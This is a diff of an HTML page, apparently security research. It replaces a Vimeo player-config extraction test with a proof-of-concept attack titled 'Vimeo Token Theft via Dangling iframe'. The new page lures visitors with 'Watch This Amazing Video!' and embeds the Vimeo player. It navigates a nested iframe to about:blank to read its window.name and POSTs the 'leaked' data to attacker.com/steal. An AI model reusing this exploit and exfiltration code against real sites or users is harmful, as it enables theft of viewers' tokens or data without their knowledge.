@@ -1,124 +1,80 @@
 <!DOCTYPE html>
- <html> 
-  <head> 
-   <title>Iframe Auth Test</title> 
-  </head> 
-  <body> 
-   <h1>Testing Vimeo Player Authentication</h1> 
-   <iframe src="https://player.vimeo.com/video/935884964?background=1" width="640" height="360" frameborder="0"> </iframe> 
-<div class="method">
-        <h2>Extract PlayerConfig</h2>
-        <input type="text" id="videoId1" placeholder="Enter Vimeo Video ID" value="935884964">
-        <button onclick="extractConfig()">Extract Config</button>
-        <pre id="result1">Results will appear here...</pre>
-    </div>
+<html>
+<head>
+    <title>Vimeo Token Theft via Dangling iframe</title>
+</head>
+<body>
+    <h1>🎬 Watch This Amazing Video!</h1>
+    
+    <!-- Step 1: Embed Vimeo player with controlled name parameter -->
+    <iframe 
+        id="vimeo"
+        src="https://player.vimeo.com/video/935884964"
+        name="vimeoPlayer"
+        width="640" 
+        height="360">
+    </iframe>
+
+    <div id="results"></div>
 
     <script>
-        function extractPlayerConfig(scriptContent) {
-            // Find where window.playerConfig starts
-            const startMatch = scriptContent.match(/window\.playerConfig\s*=\s*/);
-            if (!startMatch) return null;
+        const vimeoFrame = document.getElementById('vimeo');
+        
+        // Wait for iframe to load
+        setTimeout(() => {
+            console.log('Step 1: Vimeo iframe loaded');
             
-            const startIndex = startMatch.index + startMatch[0].length;
-            let content = scriptContent.substring(startIndex);
-            
-            // Find the matching closing brace
-            let braceCount = 0;
-            let inString = false;
-            let stringChar = null;
-            let escaped = false;
-            let endIndex = -1;
-            
-            for (let i = 0; i < content.length; i++) {
-                const char = content[i];
-                
-                if (escaped) {
-                    escaped = false;
-                    continue;
-                }
-                
-                if (char === '\\') {
-                    escaped = true;
-                    continue;
-                }
-                
-                if ((char === '"' || char === "'") && !inString) {
-                    inString = true;
-                    stringChar = char;
-                    continue;
-                }
-                
-                if (char === stringChar && inString) {
-                    inString = false;
-                    stringChar = null;
-                    continue;
-                }
-                
-                if (inString) continue;
-                
-                if (char === '{') {
-                    braceCount++;
-                } else if (char === '}') {
-                    braceCount--;
-                    if (braceCount === 0) {
-                        endIndex = i + 1;
-                        break;
-                    }
-                }
-            }
-            
-            if (endIndex === -1) return null;
-            
-            const configStr = content.substring(0, endIndex);
-            
-            try {
-                return JSON.parse(configStr);
-            } catch (e) {
-                console.error('Parse error:', e);
-                return { error: 'Failed to parse', preview: configStr.substring(0, 500) };
-            }
-        }
+            // Step 2: Try to access nested iframes within Vimeo player
+            // Vimeo player might have nested iframes for ads, analytics, etc.
+            tryDanglingAttack();
+        }, 3000);
 
-        async function extractConfig() {
-            const videoId = document.getElementById('videoId1').value;
-            const resultDiv = document.getElementById('result1');
-            
+        function tryDanglingAttack() {
             try {
-                resultDiv.textContent = 'Fetching...';
+                const vimeoWindow = vimeoFrame.contentWindow;
                 
-                const proxyUrl = 'https://api.allorigins.win/raw?url=';
-                const targetUrl = encodeURIComponent(`https://player.vimeo.com/video/${videoId}`);
+                // Check if there are nested iframes
+                console.log('Checking for nested iframes...');
                 
-                const response = await fetch(proxyUrl + targetUrl);
-                const html = await response.text();
-                
-                // Parse HTML and find script with playerConfig
-                const parser = new DOMParser();
-                const doc = parser.parseFromString(html, 'text/html');
-                const scripts = doc.querySelectorAll('script');
-                
-                let config = null;
-                
-                for (let script of scripts) {
-                    const scriptContent = script.textContent || script.innerText;
+                // Try to access nested iframe (if exists)
+                if (vimeoWindow[0]) {
+                    console.log('Found nested iframe!');
                     
-                    if (scriptContent.includes('window.playerConfig')) {
-                        console.log('Found script with playerConfig, extracting...');
-                        config = extractPlayerConfig(scriptContent);
-                        if (config) break;
-                    }
+                    // Change nested iframe to about:blank
+                    // This changes ownership to OUR origin
+                    vimeoWindow[0].location = 'about:blank';
+                    
+                    // Wait a moment for the change
+                    setTimeout(() => {
+                        try {
+                            // Now we can read window.name!
+                            const leakedData = vimeoWindow[0].name;
+                            console.log('🚨 LEAKED DATA:', leakedData);
+                            
+                            document.getElementById('results').innerHTML = 
+                                '<h2>🚨 Data Leaked!</h2><pre>' + 
+                                leakedData + 
+                                '</pre>';
+                            
+                            // Exfiltrate
+                            fetch('https://attacker.com/steal', {
+                                method: 'POST',
+                                body: leakedData
+                            });
+                            
+                        } catch(e) {
+                            console.log('Cannot read window.name:', e.message);
+                        }
+                    }, 500);
+                    
+                } else {
+                    console.log('No nested iframes found');
                 }
                 
-                if (config) {
-                    resultDiv.innerHTML = '<span class="success">✓ Config extracted successfully!</span>\n\n' + 
-                                         JSON.stringify(config, null, 2);
-                } else {
-                    resultDiv.textContent = 'Could not extract playerConfig';
-                }
-            } catch (error) {
-                resultDiv.textContent = `Error: ${error.message}\n${error.stack}`;
+            } catch(e) {
+                console.log('Error:', e.message);
             }
         }
     </script>
-  </body> 
- </html> 
+</body>
+</html>
